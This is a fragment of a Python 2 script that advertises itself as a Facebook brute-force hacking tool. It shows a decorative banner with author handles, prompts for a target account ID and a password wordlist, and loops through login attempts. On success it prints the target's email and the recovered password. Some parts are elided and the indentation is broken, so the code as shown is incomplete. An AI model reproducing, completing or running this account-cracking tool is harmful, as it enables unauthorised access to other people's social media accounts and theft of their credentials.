...
def banner():
    ...
    time.sleep(0.5)
    print GG+"  √=============================================√"
    print GL+"  |••••••   NEW TOOL HACK FACEBOOK BF.    ••••••|"
    print GG+"  √=============================================√"
    print WW+"  |            MOD BY: Whisky@Six.              |"
    print WW+"  |            FACEBOOK: thalmaung49            |"
    print Y+"   |           INSTAGRAM: thaemaung.2            |"
    print RR+"  |               Team : Alone.                 |"
    print GL+"  |---------------------------------------------|"
    print GL+"  |        We are The Union Of Myanmar          |"
    print GL+"  |---------------------------------------------|"
    print GG+"  √=============================================√"
...
print wd+"         https://www.github.com/7h43w6 "
print GG+"╭────\033[91m[\033[96m Target ID\033[95m / \033[96mUsername Target\033[91m ] "
email_target = str(raw_input(GL+"\033[92m╰─o==[]::::::::::::::::>\033[93m  "))
print " "
print "\033[92m╭────\033[91m[ \033[96m Passwords File Wordlist \033[95m(Defult-> pass.txt ) \033[91;1m]"
...
def whiskysix(whiskysix_password):
  try:
 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+_password)
	sys.stdout.flush()
	...
	if mask != login and (not 'login_attempt' in mask):
			...
			print "          P A S S W O R D  F I N D "
	         	...
	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        print (RR+"#\033[97m Passwords Target:\033[92m {}").format(whiskysix_password)
        	        print " "
